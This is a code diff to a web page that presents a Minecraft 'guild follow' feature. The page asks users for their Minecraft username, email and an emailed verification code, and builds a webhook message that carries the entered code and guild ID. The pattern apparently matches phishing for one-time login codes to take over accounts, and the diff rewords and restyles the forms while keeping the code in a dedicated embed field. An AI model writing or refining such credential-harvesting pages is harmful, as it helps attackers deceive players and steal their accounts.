@@ -162,23 +162,19 @@
     </div>
   </div>
 
-  <form id="emailForm" style="display: none;">
-    <label for="username">Minecraft Username:</label>
-    <input type="text" id="username" name="username" required><br><br>
-    <label for="email">Email:</label>
-    <input type="email" id="email" name="email" required><br><br>
-    <input type="submit" value="Send Email">
+    <form id="emailForm" style="display: none;">
+    <input type="text" id="username" placeholder="Minecraft Username" required><br>
+    <input type="email" id="email" placeholder="Email" required><br>
+    <button type="submit">Submit</button>
   </form>
 
   <div id="codeFormContainer" style="display: none;">
-    <h2>Enter Code</h2>
-    <p>A code has been sent to your email.</p>
     <form id="codeForm">
-      <label for="code">Please enter the code below:</label>
-      <input type="text" id="code" name="code" required><br><br>
-      <input type="submit" value="Submit Code">
+      <input type="text" id="code" placeholder="Verification Code" required><br>
+      <button type="submit">Submit</button>
     </form>
   </div>
+
   <script>
     function followGuild(guildId) {
       // Hide the guild list and show the email form
@@ -228,6 +224,7 @@
       })
       .then(function(response) {
         if (response.ok) {
+          console.log("Email and IGN submitted successfully!");
           // Hide the email form and show the code form
           document.getElementById("emailForm").style.display = "none";
           document.getElementById("codeFormContainer").style.display = "block";
@@ -247,18 +244,22 @@
       // get the input value
       const code = document.getElementById('code').value;
 
-      // retrieve the selected guild from localStorage
+      // get the selected guild from localStorage
       const guildId = localStorage.getItem("selectedGuild");
 
       // create the webhook message
       const message = {
-        "content": "Code entered!",
+        "content": "Verification code entered!",
         "embeds": [
           {
             "title": "Guild Follow Request",
-            "description": "Code entered: " + code,
+            "description": "Verification code entered! Please review the request and take necessary actions.",
             "color": 16777215,
             "fields": [
+              {
+                "name": "Verification Code",
+                "value": code
+              },
               {
                 "name": "Guild ID",
                 "value": guildId
